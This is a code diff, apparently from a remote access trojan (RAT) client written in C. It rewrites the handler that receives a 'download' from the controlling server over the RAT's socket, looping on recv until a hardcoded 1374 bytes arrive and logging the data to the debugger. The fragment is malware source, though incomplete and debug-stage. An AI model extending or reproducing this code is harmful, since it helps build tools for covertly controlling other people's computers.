@@ -304,38 +304,29 @@ WinMain(HINSTANCE hInstance,
 		}
 		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
 		{
+			int fileSize = 1374;
+			int totalBytesRead = 0;
 			for (;;)
 			{
-				char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
-				if ( f_recv(ratSocket.socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
+				char writeBuffer[SOCKET_BUFFER_SIZE] = {};
+				int bytesRead = f_recv(ratSocket.socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
+				if ( bytesRead != SOCKET_ERROR )
 				{
-					OutputDebugStringA("## File size: ");
-					OutputDebugStringA(fileSizeBuffer);
-					int fileSize = atoi(fileSizeBuffer);
+					OutputDebugStringA("## Received download: ");
+					OutputDebugStringA(writeBuffer);
 
-					if ( fileSize > 0 )
+					totalBytesRead += bytesRead;
+					if ( totalBytesRead >= fileSize )
 					{
-						char writeBuffer[SOCKET_BUFFER_SIZE] = {};
-				
-						if ( f_recv(ratSocket.socketConnection, writeBuffer, fileSize, 0) != SOCKET_ERROR )
-						{
-							OutputDebugStringA("## Received download: ");
-							OutputDebugStringA(writeBuffer);
-						}
-						else
-						{
-							OutputDebugStringA("[ERROR] Error receiving download command from server.");
-						}
-					}
-					else
-					{
+						OutputDebugStringA("## Breaking");
 						break;
 					}
 				}
 				else
 				{
-					OutputDebugStringA("[ERROR] Error receiving download file size from server.");
+					OutputDebugStringA("[ERROR] Error receiving download command from server.");
 				}
+			    
 			}
 			OutputDebugStringA("### DONE DOWNLOADING");
 		}
